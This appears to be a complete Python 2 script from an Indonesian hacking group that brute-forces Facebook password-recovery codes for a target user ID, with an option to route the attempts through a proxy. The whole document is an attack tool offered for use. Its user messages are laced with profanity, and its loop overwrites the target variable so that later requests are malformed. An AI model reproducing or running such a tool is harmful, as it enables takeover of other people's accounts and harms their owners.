

import urllib2 ,sys ,re
import os
import ssl
import time

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

cls()

os.system(['','color D'][os.name == 'nt'])

print '''
                SELAMAT DATANG
                     DI
                ANT CYBER TEAM
           CODE: Mr.C1TY3920
     FACEBOOK RECOVERY PASSWORD ATTACKER
  
 _____              _                 _
|  ___|_ _  ___ ___| |__   ___   ___ | | __
| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\                                '''
if len(sys.argv) != 3:
    print "\n\n[#] Penulisan: python2 fb.py [TagetID] [listkode.txt] "
    sys.exit()

target = sys.argv[1]
wordlist = sys.argv[2]


while True:
    print """
    ============ Menu ==============
    1- Mulai Ngocok(Craking password)
    2- Langsung Crot (Dengan Proxy saja)
    
    """

    choice=raw_input("Masuka  Pilihan Mu: ")

    if choice=="1":
        try:
            word = open(wordlist, 'r').readlines()
            print "[+] Kode Nya Tersimpan \!/\n[+] Codes:",len(word)
        except("IOError"):
            print "[-] Hanya dalam Format .txt Ngentod :v"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
    
            except IOError:
                print " Gara Gara Lu Buriq Halaman Nya Gak Bisa Di Buka Tod•_• "
    
            search = re.search('password_new', get)
            if search:
                print "[+] Kode Yang Ini "+w+" HOKI LU TOD BENER PASSWORD NYA •////•"
            else:
                print "[+] Kode Yangini "+w+" Sabar Lagi Nyoba Keberuntungan Lu "
    else:

        print """

        Selamat Datang Di Tools Saya Masukan Proxy:Port Anda Beb:*

        Penggunaan : [ip:port]


        """
        ip_proxy=raw_input("Masukan Proxy Mu  : ")
        print "[##] Proxy Terpasang : "+ip_proxy
        proxy = urllib2.ProxyHandler({'http': ip_proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
        #print theIP
        #datum = response.read()
        #response.close()
        #print datum
        try:
            word = open(wordlist, 'r').readlines()
            print "[+] Kode Reset Tersimpan \!/\n[+] Kodd:",len(word)
        except("IOError"):
            print "[-] Cok Yang Ini Gabisa Di Pake Anjirr !!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
                
            except IOError:
                print " Gara Gara Lu Buriq Halaman Nya Gak Bisa Di Buka Tod•_• "
        
            search = re.search('password_new', get)
            if search:
                print "[+] Kodenya yang ini "+w+" Hoki Lu Kontol Sayang :* "
            else:
                print "[+] Kode Yang Ini "+w+" Gabisa Sabar ya Tod :v "